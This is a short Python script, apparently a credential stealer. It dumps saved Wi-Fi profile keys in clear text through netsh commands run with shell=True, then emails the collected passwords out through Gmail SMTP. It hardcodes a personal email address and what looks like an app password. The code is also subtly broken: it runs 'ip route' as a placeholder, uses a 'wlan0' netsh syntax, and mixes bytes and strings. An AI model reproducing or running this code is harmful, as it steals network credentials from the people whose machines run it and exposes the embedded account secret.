import subprocess as sp
import smtplib as sm
import re


def send_mail(email,password,message):
    server = sm.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()

# eg - netsh wlan0 show profile 
command = "ip route" # change me as per need 
out = sp.check_output(command,shell=True)
filters = re.findall("(Profile\s*:\s)(.*)",out)
result = ""

for i in filters:
    commands = 'netsh wlan0 show profile "{}" key=clear'.format(i)
    passwd = sp.check_output(commands,shell=True)
    result = result+passwd



email = "hariramsubbiah98@gmail.com"
password = "qglg rhcm zutf moau"

send_mail(email,password,result)